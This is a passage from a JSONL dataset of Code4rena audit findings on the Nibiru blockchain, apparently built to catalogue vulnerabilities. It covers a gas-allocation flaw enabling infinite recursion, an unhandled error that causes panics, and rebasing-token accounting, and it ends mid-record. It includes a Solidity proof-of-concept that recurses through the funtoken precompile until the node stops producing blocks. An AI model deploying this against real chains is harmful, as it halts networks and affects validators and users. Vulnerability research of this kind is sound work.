p.evmKeeper.ERC20().Transfer(erc20, caller, transferTo, amount, ctx)\n150: \tif err != nil {\n151: \t\treturn nil, fmt.Errorf(\"error in ERC20.transfer from caller to EVM account: %w\", err)\n152: \t}\n```\n\nThe `Burn` call in `sendToBank` is instead secure because it only applies to ERC20 tokens deployed from Coins whose EVM contract is safe.\n\n## Proof of Concept\n\nFor the `balance/balanceOf` attack path (and a more comprehensive, but slower, end-to-end test), this [GitHub Gist](https://gist.github.com/3docSec/7e8f04b601d08fb8af0319179da10e33) includes a coded PoC in the form of an e2e test that:\n- creates an attack ERC-20 token with a function that calls itself through the `funtoken` precompile\n- registers this token as `funtoken` (the call takes a fee but is otherwise permissionless)\n- calls the infinite recursing function\n\nThis test can be run while monitoring the memory consumption of the `localnet` `nibid` process:\n- before the test, the `nibd` process consumes steadily ~100Mb of memory\n- after the `go()` call is triggered:\n    - memory consumption increases at ~10Mb/sec until `nibd` gets eventually killed\n    - even during memory ramp up, the test network stops producing blocks due to consensus timeout\n\n---\n\nFor the `sendToBank/transfer` attack path, the infinite recursion can be tested by changing the `transfer` function in the `TestERC20MaliciousTransfer` test contract as follows:\n\n```solidity\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\n\n    // ...\n\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        (bool res, bytes memory data) = address(0x800).call(\n            abi.encodeWithSignature(\n                \"sendToBank(address,uint256,string)\",\n                address(this),\n                Strings.toHexString(uint160(to))\n            )\n        );\n        require(res, string(data));\n        return true;\n    }\n```\n\nthen, running the `TestFunTokenFromERC20MaliciousTransfer` test in `x/evm/keeper/funtoken_from_erc20_test.go` will hang in an infinite recursion that will quickly eat up all memory available.\n\n## Recommended Mitigation Steps\nConsider refactoring the `evmKeeper.ERC20().BalanceOf` and `evmKeeper.ERC20().Transfer` calls to accept as argument, and use at most, 63/64 of the EVM gas available.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L149\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L285\n\n\n# Vulnerability details\n\nThe `funtoken` precompile allows an EVM caller to access information about tokens that coexist in the Cosmos (\"coin\") and EVM (\"ERC20\") spaces.\n\nSome operations performed by this precompile consist of EVM calls; for example, if we look at the `balance` method:\n```go\nFile: funtoken.go\n265: func (p precompileFunToken) balance(\n266: \tstart OnRunStartResult,\n267: \tcontract *vm.Contract,\n268: ) (bz []byte, err error) {\n---\n285: \terc20Bal, err := p.evmKeeper.ERC20().BalanceOf(funtoken.Erc20Addr.Address, addrEth, ctx)\n286: \tif err != nil {\n287: \t\treturn\n288: \t}\n```\nwe see that for fetching the EVM info, it calls the `evmKeeper.ERC20().BalanceOf` function:\n```go\nFile: erc20.go\n125: func (e erc20Calls) BalanceOf(\n126: \tcontract, account gethcommon.Address,\n127: \tctx sdk.Context,\n128: ) (out *big.Int, err error) {\n129: \treturn e.LoadERC20BigInt(ctx, e.ABI, contract, \"balanceOf\", account)\n130: }\n```\nwhich in turn calls `LoadERC20BigInt`:\n```go\nFile: erc20.go\n222: func (k Keeper) LoadERC20BigInt(\n223: \tctx sdk.Context,\n224: \tabi *gethabi.ABI,\n225: \tcontract gethcommon.Address,\n226: \tmethodName string,\n227: \targs ...any,\n228: ) (out *big.Int, err error) {\n229: \tres, err := k.CallContract(\n230: \t\tctx,\n231: \t\tabi,\n232: \t\tevm.EVM_MODULE_ADDRESS, // @audit from\n233: \t\t&contract,\n234: \t\tfalse, // @audit commit = false\n235: \t\tErc20GasLimitQuery, // @audit 100_000\n236: \t\tmethodName,\n237: \t\targs...,\n238: \t)\n239: \tif err != nil {\n240: \t\treturn nil, err\n241: \t}\n```\n\nIf we look closely to how this callback to the EVM is done, we see that the gas allowed for this call is hardcoded to `100_000` and is charged only after the call returned.\n\nThis is problematic because `100_000` is allocated regardless of the gas limit used to call the `funtoken` precompile, and this breaks the [core invariant of the 63/64 gas allocation](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) that ultimately secures EVM implementation from infinite recursions, which can halt block production and cause the validator to be slashed.\n\nWhile the `balance` example was described in detail, the same applies to the `Transfer` call in `sendToBank`:\n\n```go\nFile: funtoken.go\n109: func (p precompileFunToken) sendToBank(\n110: \tstartResult OnRunStartResult,\n111: \tcaller gethcommon.Address,\n112: \treadOnly bool,\n113: ) (bz []byte, err error) {\n---\n149: \tgotAmount, transferResp, err := p.evmKeeper.ERC20().Transfer(erc20, caller, transferTo, amount, ctx)\n150: \tif err != nil {\n151: \t\treturn nil, fmt.Errorf(\"error in ERC20.transfer from caller to EVM account: %w\", err)\n152: \t}\n```\n\nThe `Burn` call in `sendToBank` is instead secure because it only applies to ERC20 tokens deployed from Coins whose EVM contract is safe.\n\n## Proof of Concept\n\nFor the `balance/balanceOf` attack path (and a more comprehensive, but slower, end-to-end test), this [GitHub Gist](https://gist.github.com/3docSec/7e8f04b601d08fb8af0319179da10e33) includes a coded PoC in the form of an e2e test that:\n- creates an attack ERC-20 token with a function that calls itself through the `funtoken` precompile\n- registers this token as `funtoken` (the call takes a fee but is otherwise permissionless)\n- calls the infinite recursing function\n\nThis test can be run while monitoring the memory consumption of the `localnet` `nibid` process:\n- before the test, the `nibd` process consumes steadily ~100Mb of memory\n- after the `go()` call is triggered:\n    - memory consumption increases at ~10Mb/sec until `nibd` gets eventually killed\n    - even during memory ramp up, the test network stops producing blocks due to consensus timeout\n\n---\n\nFor the `sendToBank/transfer` attack path, the infinite recursion can be tested by changing the `transfer` function in the `TestERC20MaliciousTransfer` test contract as follows:\n\n```solidity\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\n\n    // ...\n\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        (bool res, bytes memory data) = address(0x800).call(\n            abi.encodeWithSignature(\n                \"sendToBank(address,uint256,string)\",\n                address(this),\n                Strings.toHexString(uint160(to))\n            )\n        );\n        require(res, string(data));\n        return true;\n    }\n```\n\nthen, running the `TestFunTokenFromERC20MaliciousTransfer` test in `x/evm/keeper/funtoken_from_erc20_test.go` will hang in an infinite recursion that will quickly eat up all memory available.\n\n## Recommended Mitigation Steps\nConsider refactoring the `evmKeeper.ERC20().BalanceOf` and `evmKeeper.ERC20().Transfer` calls to accept as argument, and use at most, 63/64 of the EVM gas available."}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-005", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 5, "page_start": null, "title": "The `bankBalance` function failed to handle errors correctly.", "short_summary": null, "description_md": "## Finding description and impact\n\n\nThe `bankBalance` function does not handle errors after decoding the call parameters.\nAs a result, `p.evmKeeper.Bank.GetBalance` may throw a panic, and this erroneous panic cannot be recovered by `HandleOutOfGasPanic`, leading to the erroneous panic being propagated further up the program.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378\n\n\n# Vulnerability details\n\n## Finding description and impact\n\n\nThe `bankBalance` function does not handle errors after decoding the call parameters.\nAs a result, `p.evmKeeper.Bank.GetBalance` may throw a panic, and this erroneous panic cannot be recovered by `HandleOutOfGasPanic`, leading to the erroneous panic being propagated further up the program.\n\n## Proof of Concept\ngithub:[https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378)\n```go\nfunc (p precompileFunToken) bankBalance(\n\tstart OnRunStartResult,\n\tcontract *vm.Contract,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertContractQuery(contract); err != nil {\n\t\treturn bz, err\n\t}\n\n@>\taddrEth, addrBech32, bankDenom, err := p.parseArgsBankBalance(args)\n\tbankBal := p.evmKeeper.Bank.GetBalance(ctx, addrBech32, bankDenom).Amount.BigInt()\n\n\treturn method.Outputs.Pack([]any{\n\t\tbankBal,\n\t\tstruct {\n\t\t\tEthAddr    gethcommon.Address `json:\"ethAddr\"`\n\t\t\tBech32Addr string             `json:\"bech32Addr\"`\n\t\t}{\n\t\t\tEthAddr:    addrEth,\n\t\t\tBech32Addr: addrBech32.String(),\n\t\t},\n\t}...)\n}\n```\nIt can be observed that even if `parseArgsBankBalance` returns an error during decoding, the program will still proceed to call `p.evmKeeper.Bank.GetBalance` using incorrect data.\n```go\n// GetBalance returns the balance of a specific denomination for a given account\n// by address.\nfunc (k BaseViewKeeper) GetBalance(ctx sdk.Context, addr sdk.AccAddress, denom string) sdk.Coin {\n\taccountStore := k.getAccountStore(ctx, addr)\n\tbz := accountStore.Get([]byte(denom))\n\tbalance, err := UnmarshalBalanceCompat(k.cdc, bz, denom)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\treturn balance\n}\n```\nThis is likely to cause `GetBalance` to throw a panic. This panic is unexpected and, therefore, cannot be caught by `HandleOutOfGasPanic`, resulting in the program further throwing an exception.\n```go\nfunc HandleOutOfGasPanic(err *error) func() {\n\treturn func() {\n\t\tif r := recover(); r != nil {\n\t\t\tswitch r.(type) {\n\t\t\tcase sdk.ErrorOutOfGas:\n\t\t\t\t*err = vm.ErrOutOfGas\n\t\t\tdefault:\n\t\t\t\tpanic(r)\n\t\t\t}\n\t\t}\n\t}\n}\n```\n## Recommended mitigation steps\n\n```diff\nfunc (p precompileFunToken) bankBalance(\n\tstart OnRunStartResult,\n\tcontract *vm.Contract,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertContractQuery(contract); err != nil {\n\t\treturn bz, err\n\t}\n\n  \taddrEth, addrBech32, bankDenom, err := p.parseArgsBankBalance(args)\n+\tif err != nil {\n+\t\terr = ErrInvalidArgs(err)\n+\t\treturn\n+\t}\n\tbankBal := p.evmKeeper.Bank.GetBalance(ctx, addrBech32, bankDenom).Amount.BigInt()\n\n\treturn method.Outputs.Pack([]any{\n\t\tbankBal,\n\t\tstruct {\n\t\t\tEthAddr    gethcommon.Address `json:\"ethAddr\"`\n\t\t\tBech32Addr string             `json:\"bech32Addr\"`\n\t\t}{\n\t\t\tEthAddr:    addrEth,\n\t\t\tBech32Addr: addrBech32.String(),\n\t\t},\n\t}...)\n}\n\n```\n", "sections": {"description_md": "## Finding description and impact\n\n\nThe `bankBalance` function does not handle errors after decoding the call parameters.\nAs a result, `p.evmKeeper.Bank.GetBalance` may throw a panic, and this erroneous panic cannot be recovered by `HandleOutOfGasPanic`, leading to the erroneous panic being propagated further up the program.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\n```diff\nfunc (p precompileFunToken) bankBalance(\n\tstart OnRunStartResult,\n\tcontract *vm.Contract,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertContractQuery(contract); err != nil {\n\t\treturn bz, err\n\t}\n\n  \taddrEth, addrBech32, bankDenom, err := p.parseArgsBankBalance(args)\n+\tif err != nil {\n+\t\terr = ErrInvalidArgs(err)\n+\t\treturn\n+\t}\n\tbankBal := p.evmKeeper.Bank.GetBalance(ctx, addrBech32, bankDenom).Amount.BigInt()\n\n\treturn method.Outputs.Pack([]any{\n\t\tbankBal,\n\t\tstruct {\n\t\t\tEthAddr    gethcommon.Address `json:\"ethAddr\"`\n\t\t\tBech32Addr string             `json:\"bech32Addr\"`\n\t\t}{\n\t\t\tEthAddr:    addrEth,\n\t\t\tBech32Addr: addrBech32.String(),\n\t\t},\n\t}...)\n}\n\n```\n", "poc_md": "## Proof of Concept\ngithub:[https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378)\n```go\nfunc (p precompileFunToken) bankBalance(\n\tstart OnRunStartResult,\n\tcontract *vm.Contract,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertContractQuery(contract); err != nil {\n\t\treturn bz, err\n\t}\n\n@>\taddrEth, addrBech32, bankDenom, err := p.parseArgsBankBalance(args)\n\tbankBal := p.evmKeeper.Bank.GetBalance(ctx, addrBech32, bankDenom).Amount.BigInt()\n\n\treturn method.Outputs.Pack([]any{\n\t\tbankBal,\n\t\tstruct {\n\t\t\tEthAddr    gethcommon.Address `json:\"ethAddr\"`\n\t\t\tBech32Addr string             `json:\"bech32Addr\"`\n\t\t}{\n\t\t\tEthAddr:    addrEth,\n\t\t\tBech32Addr: addrBech32.String(),\n\t\t},\n\t}...)\n}\n```\nIt can be observed that even if `parseArgsBankBalance` returns an error during decoding, the program will still proceed to call `p.evmKeeper.Bank.GetBalance` using incorrect data.\n```go\n// GetBalance returns the balance of a specific denomination for a given account\n// by address.\nfunc (k BaseViewKeeper) GetBalance(ctx sdk.Context, addr sdk.AccAddress, denom string) sdk.Coin {\n\taccountStore := k.getAccountStore(ctx, addr)\n\tbz := accountStore.Get([]byte(denom))\n\tbalance, err := UnmarshalBalanceCompat(k.cdc, bz, denom)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\treturn balance\n}\n```\nThis is likely to cause `GetBalance` to throw a panic. This panic is unexpected and, therefore, cannot be caught by `HandleOutOfGasPanic`, resulting in the program further throwing an exception.\n```go\nfunc HandleOutOfGasPanic(err *error) func() {\n\treturn func() {\n\t\tif r := recover(); r != nil {\n\t\t\tswitch r.(type) {\n\t\t\tcase sdk.ErrorOutOfGas:\n\t\t\t\t*err = vm.ErrOutOfGas\n\t\t\tdefault:\n\t\t\t\tpanic(r)\n\t\t\t}\n\t\t}\n\t}\n}\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378\n\n\n# Vulnerability details\n\n## Finding description and impact\n\n\nThe `bankBalance` function does not handle errors after decoding the call parameters.\nAs a result, `p.evmKeeper.Bank.GetBalance` may throw a panic, and this erroneous panic cannot be recovered by `HandleOutOfGasPanic`, leading to the erroneous panic being propagated further up the program.\n\n## Proof of Concept\ngithub:[https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378)\n```go\nfunc (p precompileFunToken) bankBalance(\n\tstart OnRunStartResult,\n\tcontract *vm.Contract,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertContractQuery(contract); err != nil {\n\t\treturn bz, err\n\t}\n\n@>\taddrEth, addrBech32, bankDenom, err := p.parseArgsBankBalance(args)\n\tbankBal := p.evmKeeper.Bank.GetBalance(ctx, addrBech32, bankDenom).Amount.BigInt()\n\n\treturn method.Outputs.Pack([]any{\n\t\tbankBal,\n\t\tstruct {\n\t\t\tEthAddr    gethcommon.Address `json:\"ethAddr\"`\n\t\t\tBech32Addr string             `json:\"bech32Addr\"`\n\t\t}{\n\t\t\tEthAddr:    addrEth,\n\t\t\tBech32Addr: addrBech32.String(),\n\t\t},\n\t}...)\n}\n```\nIt can be observed that even if `parseArgsBankBalance` returns an error during decoding, the program will still proceed to call `p.evmKeeper.Bank.GetBalance` using incorrect data.\n```go\n// GetBalance returns the balance of a specific denomination for a given account\n// by address.\nfunc (k BaseViewKeeper) GetBalance(ctx sdk.Context, addr sdk.AccAddress, denom string) sdk.Coin {\n\taccountStore := k.getAccountStore(ctx, addr)\n\tbz := accountStore.Get([]byte(denom))\n\tbalance, err := UnmarshalBalanceCompat(k.cdc, bz, denom)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\treturn balance\n}\n```\nThis is likely to cause `GetBalance` to throw a panic. This panic is unexpected and, therefore, cannot be caught by `HandleOutOfGasPanic`, resulting in the program further throwing an exception.\n```go\nfunc HandleOutOfGasPanic(err *error) func() {\n\treturn func() {\n\t\tif r := recover(); r != nil {\n\t\t\tswitch r.(type) {\n\t\t\tcase sdk.ErrorOutOfGas:\n\t\t\t\t*err = vm.ErrOutOfGas\n\t\t\tdefault:\n\t\t\t\tpanic(r)\n\t\t\t}\n\t\t}\n\t}\n}\n```\n## Recommended mitigation steps\n\n```diff\nfunc (p precompileFunToken) bankBalance(\n\tstart OnRunStartResult,\n\tcontract *vm.Contract,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertContractQuery(contract); err != nil {\n\t\treturn bz, err\n\t}\n\n  \taddrEth, addrBech32, bankDenom, err := p.parseArgsBankBalance(args)\n+\tif err != nil {\n+\t\terr = ErrInvalidArgs(err)\n+\t\treturn\n+\t}\n\tbankBal := p.evmKeeper.Bank.GetBalance(ctx, addrBech32, bankDenom).Amount.BigInt()\n\n\treturn method.Outputs.Pack([]any{\n\t\tbankBal,\n\t\tstruct {\n\t\t\tEthAddr    gethcommon.Address `json:\"ethAddr\"`\n\t\t\tBech32Addr string             `json:\"bech32Addr\"`\n\t\t}{\n\t\t\tEthAddr:    addrEth,\n\t\t\tBech32Addr: addrBech32.String(),\n\t\t},\n\t}...)\n}\n\n```\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378\n\n\n# Vulnerability details\n\n## Finding description and impact\n\n\nThe `bankBalance` function does not handle errors after decoding the call parameters.\nAs a result, `p.evmKeeper.Bank.GetBalance` may throw a panic, and this erroneous panic cannot be recovered by `HandleOutOfGasPanic`, leading to the erroneous panic being propagated further up the program.\n\n## Proof of Concept\ngithub:[https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L378)\n```go\nfunc (p precompileFunToken) bankBalance(\n\tstart OnRunStartResult,\n\tcontract *vm.Contract,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertContractQuery(contract); err != nil {\n\t\treturn bz, err\n\t}\n\n@>\taddrEth, addrBech32, bankDenom, err := p.parseArgsBankBalance(args)\n\tbankBal := p.evmKeeper.Bank.GetBalance(ctx, addrBech32, bankDenom).Amount.BigInt()\n\n\treturn method.Outputs.Pack([]any{\n\t\tbankBal,\n\t\tstruct {\n\t\t\tEthAddr    gethcommon.Address `json:\"ethAddr\"`\n\t\t\tBech32Addr string             `json:\"bech32Addr\"`\n\t\t}{\n\t\t\tEthAddr:    addrEth,\n\t\t\tBech32Addr: addrBech32.String(),\n\t\t},\n\t}...)\n}\n```\nIt can be observed that even if `parseArgsBankBalance` returns an error during decoding, the program will still proceed to call `p.evmKeeper.Bank.GetBalance` using incorrect data.\n```go\n// GetBalance returns the balance of a specific denomination for a given account\n// by address.\nfunc (k BaseViewKeeper) GetBalance(ctx sdk.Context, addr sdk.AccAddress, denom string) sdk.Coin {\n\taccountStore := k.getAccountStore(ctx, addr)\n\tbz := accountStore.Get([]byte(denom))\n\tbalance, err := UnmarshalBalanceCompat(k.cdc, bz, denom)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\treturn balance\n}\n```\nThis is likely to cause `GetBalance` to throw a panic. This panic is unexpected and, therefore, cannot be caught by `HandleOutOfGasPanic`, resulting in the program further throwing an exception.\n```go\nfunc HandleOutOfGasPanic(err *error) func() {\n\treturn func() {\n\t\tif r := recover(); r != nil {\n\t\t\tswitch r.(type) {\n\t\t\tcase sdk.ErrorOutOfGas:\n\t\t\t\t*err = vm.ErrOutOfGas\n\t\t\tdefault:\n\t\t\t\tpanic(r)\n\t\t\t}\n\t\t}\n\t}\n}\n```\n## Recommended mitigation steps\n\n```diff\nfunc (p precompileFunToken) bankBalance(\n\tstart OnRunStartResult,\n\tcontract *vm.Contract,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertContractQuery(contract); err != nil {\n\t\treturn bz, err\n\t}\n\n  \taddrEth, addrBech32, bankDenom, err := p.parseArgsBankBalance(args)\n+\tif err != nil {\n+\t\terr = ErrInvalidArgs(err)\n+\t\treturn\n+\t}\n\tbankBal := p.evmKeeper.Bank.GetBalance(ctx, addrBech32, bankDenom).Amount.BigInt()\n\n\treturn method.Outputs.Pack([]any{\n\t\tbankBal,\n\t\tstruct {\n\t\t\tEthAddr    gethcommon.Address `json:\"ethAddr\"`\n\t\t\tBech32Addr string             `json:\"bech32Addr\"`\n\t\t}{\n\t\t\tEthAddr:    addrEth,\n\t\t\tBech32Addr: addrBech32.String(),\n\t\t},\n\t}...)\n}\n\n```\n"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-014", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 14, "page_start": null, "title": "Nibiru's bank coin to EVM balance tracking logic is completely broken for rebasing tokens and would lead to leakage/loss of funds when converting", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L567-L624\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L129-L137\n\n\n# Vulnerability details\n\n\n## Summary\n\nThe Nibiru EVM module's token conversion mechanism contains a critical vulnerability when handling rebasing tokens. The issue stems from an incorrect assumption about the 1:1 relationship between escrowed ERC20 tokens and their bank coin representations, which can be violated when token balances change outside of transfers (e.g., through rebasing) and these type of tokens are supported by Nibiru\n\n## Vulnerability Details\n\n### Context\n\nThe Nibiru EVM module supports converting ERC20 tokens to bank coins and vice versa. When converting from ERC20 to bank coins, the tokens are escrowed in the EVM module, and when converting back, these escrowed tokens are used to fulfill the conversion.\n\nThis logic can be seen in the `ConvertCoinToEvm`, `convertCoinToEvmBornERC20` and `convertEvmToCoin` functions in the `msg_server.go` file, see [x/evm/keeper/msg_server.go#L486-L561](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L486-L624).\n\n### Problem\n\nThe conversion mechanism assumes a static 1:1 relationship between escrowed ERC20 tokens and bank coins, as evidenced in the `convertCoinToEvmBornERC20` function that is used when [converting the bank coins back to its ERC20 representation](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L510-L513):\n\nSee https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L567-L624\n\n```go\nfunc (k Keeper) convertCoinToEvmBornERC20(\n\tctx sdk.Context,\n\tsender sdk.AccAddress,\n\trecipient gethcommon.Address,\n\tcoin sdk.Coin,\n\tfunTokenMapping evm.FunToken,\n) (*evm.MsgConvertCoinToEvmResponse, error) {\n\terc20Addr := funTokenMapping.Erc20Addr.Address\n\t// 1 | Caller transfers Bank Coins to be converted to ERC20 tokens.\n\tif err := k.Bank.SendCoinsFromAccountToModule(\n\t\tctx,\n\t\tsender,\n\t\tevm.ModuleName,\n\t\tsdk.NewCoins(coin),\n\t); err != nil {\n\t\treturn nil, errors.Wrap(err, \"error sending Bank Coins to the EVM\")\n\t}\n\n\t// 2 | EVM sends ERC20 tokens to the \"to\" account.\n\t// This should never fail due to the EVM account lacking ERc20 fund because\n\t// the an account must have sent the EVM module ERC20 tokens in the mapping\n\t// in order to create the coins originally.\n\t//\n\t// Said another way, if an asset is created as an ERC20 and some amount is\n\t// converted to its Bank Coin representation, a balance of the ERC20 is left\n\t// inside the EVM module account in order to convert the coins back to\n\t// ERC20s.\n\tactualSentAmount, _, err := k.ERC20().Transfer(\n\t\terc20Addr,\n\t\tevm.EVM_MODULE_ADDRESS,\n\t\trecipient,\n\t\tcoin.Amount.BigInt(),\n\t\tctx,\n\t)\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n\t}\n\n\t// 3 | In the FunToken ERC20  BC conversion process that preceded this\n\t// TxMsg, the Bank Coins were minted. Consequently, to preserve an invariant\n\t// on the sum of the FunToken's bank and ERC20 supply, we burn the coins here\n\t// in the BC  ERC20 conversion.\n\tburnCoin := sdk.NewCoin(coin.Denom, sdk.NewIntFromBigInt(actualSentAmount))\n\terr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(burnCoin))\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to burn coins\")\n\t}\n\n\t// Emit event with the actual amount received\n\t_ = ctx.EventManager().EmitTypedEvent(&evm.EventConvertCoinToEvm{\n\t\tSender:               sender.String(),\n\t\tErc20ContractAddress: funTokenMapping.Erc20Addr.String(),\n\t\tToEthAddr:            recipient.String(),\n\t\tBankCoin:             burnCoin,\n\t})\n\n\treturn &evm.MsgConvertCoinToEvmResponse{}, nil\n}\n```\n\nEvidently, Nibiru makes a critical assumption (invariant) about token availability as shown in the snippet above\n\n```markdown\n    // This should never fail due to the EVM account lacking ERc20 fund because\n    // the an account must have sent the EVM module ERC20 tokens in the mapping\n    // in order to create the coins originally.\n    //\n    // Said another way, if an asset is created as an ERC20 and some amount is\n    // converted to its Bank Coin representation, a balance of the ERC20 is left\n    // inside the EVM module account in order to convert the coins back to\n    // ERC20s.\n```\n\nHowever, this assumption would be incorrect for some supported tokens like rebasing tokens, which have been hinted to be used by Nibiru as shown in the README:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L129-L137\n\n```markdown\n### ERC20 token behaviors in scope\n\n| Question                                                                                                                                                   | Answer   |\n| 